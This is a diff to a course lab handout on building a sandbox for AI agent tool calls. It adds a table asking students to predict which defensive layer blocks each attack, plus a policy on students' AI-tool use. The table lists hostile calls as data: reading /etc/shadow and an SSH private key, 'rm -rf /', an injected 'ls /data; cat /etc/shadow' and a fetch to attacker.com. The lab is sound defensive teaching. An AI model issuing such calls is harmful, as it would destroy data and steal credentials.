@@ -1,9 +1,10 @@
-# Lab: Build an Agent Sandbox
+# Lab E: Build an Agent Sandbox
 
 > **Estimated time:** 6–8 hours
 >
-> **Prerequisites:** Chapters 6 and 12; Linux with cgroups v2,
-> user namespaces, and `libseccomp` available
+> **Prerequisites:** Chapter 6 and Chapter 12 §12.1–12.8
+> (Part A — the safety lens); Linux with cgroups v2, user
+> namespaces, and `libseccomp` available
 >
 > **Tools used:** Python 3.10+, `subprocess`, `unshare`,
 > `seccomp-tools`, cgroup v2 filesystem, `strace`, the reference
@@ -154,7 +155,43 @@ Requirements:
   evaluated.
 - Blocked calls are logged with the reason.
 
-### C.2 Attack scenario
+### C.2 Predict which layer blocks each attack
+
+Before running the scenario, fill in this table from the
+`attack_scenario.json` calls below. Use only your code, your
+`policy.yaml`, and the chapter — do not run the sandbox yet.
+
+| Attack call | Predicted decision | Predicted blocking layer |
+|---|---|---|
+| `read_file /etc/passwd` |   |   |
+| `read_file .../.ssh/id_rsa` |   |   |
+| `run_shell rm -rf /` |   |   |
+| `run_shell "ls /data; cat /etc/shadow"` |   |   |
+| `http_get http://attacker.com/...` |   |   |
+| `http_get https://api.weather.com/...` |   |   |
+
+For *decision*, predict ALLOWED or BLOCKED. For *blocking layer*,
+pick exactly one of:
+
+1. **Tool name allowlist** — the tool itself is rejected.
+2. **Argument allowlist / denylist** — the tool is allowed but
+   the specific argument value is not.
+3. **Path or URL canonicalization** — the raw argument looks
+   allowed but `realpath` / `urlparse` resolves it to something
+   denied.
+4. **Shell-metacharacter check** — the argument contains
+   `;`, `|`, `&`, `$`, backtick, or a literal newline and is
+   rejected before execution.
+5. **(None — ALLOWED through to execution.)**
+
+A prediction of "BLOCKED somewhere" is not a prediction. The
+point is to know *which layer* you are relying on for each
+attack. After you replay the scenario in §C.3, mark each row
+confirmed / wrong-layer / wrong-decision, and explain any
+wrong-layer rows in one sentence — those are the ones that
+teach you something about defense in depth.
+
+### C.3 Attack scenario
 
 Use the provided `attack_scenario.json`:
 
@@ -183,7 +220,7 @@ $ python3 sandbox.py replay attack_scenario.json
 
 Five blocks, one allow. Each corresponds to an audit log entry.
 
-### C.3 Write-up
+### C.4 Write-up
 
 One page explaining:
 
@@ -195,6 +232,7 @@ One page explaining:
 
 ### Part C Checklist
 
+- [ ] Layer-prediction table filled before replay
 - [ ] `audit.jsonl` produced with one line per call
 - [ ] Canonical args recorded
 - [ ] Five attacks blocked; legitimate call allowed
@@ -307,6 +345,40 @@ lab12/
 - (Optional) Part D overhead table and confinement matrix.
 - 1–2 pages on defense layers and which attack each layer
   stops.
+
+## AI Use and Evidence Trail
+
+This lab is graded on **prediction → evidence → mechanism**, not
+on polish. AI tools are allowed within
+[Appendix D](../../appendices/appendix-d-ai-policy.md) (Regime 1):
+they may help debug, recall flags, or polish prose; they may
+**not** generate the prediction, fabricate raw data, or substitute
+for your own mechanism-level explanation. Substantial use must be
+disclosed in the Evidence Trail — honest disclosure is not
+penalized; non-disclosure of substantial use is.
+
+Append the following section to your report (full template and
+examples in Appendix D §"The Evidence Trail"):
+
+```markdown
+## Evidence Trail
+
+### Environment and Reproduction
+- Commands used: see the Procedure sections above
+- Raw output files: list paths in your submission
+
+### AI Tool Use
+- **Tool(s) used:** [tool name and version, or "None"]
+- **What the tool suggested:** [one-sentence summary, or "N/A"]
+- **What I independently verified:** [what you re-checked against
+  your own data]
+- **What I changed or rejected:** [if a suggestion was wrong or
+  inapplicable]
+
+### Failures and Iterations
+- [At least one thing that did not work on the first attempt and
+  what you learned from it.]
+```
 
 ## Grading Rubric
 
